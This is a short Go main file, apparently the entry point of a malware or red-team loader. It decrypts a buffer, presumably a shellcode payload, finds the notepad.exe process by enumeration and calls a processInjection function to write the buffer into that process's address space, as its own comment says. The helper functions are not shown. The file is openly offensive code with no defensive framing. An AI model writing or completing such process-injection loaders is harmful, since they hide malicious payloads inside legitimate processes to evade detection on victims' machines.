package main

import "fmt"

func main() {

	encrypt()
	buf := decrypt()
	fmt.Println((len(buf)))

	processInjection(uintptr(processEnumeration("notepad.exe")), &buf[0], uintptr(len(buf))) //inject into notepad.exe address space
	//fmt.Println(processEnumeration("notepad.exe"))
}
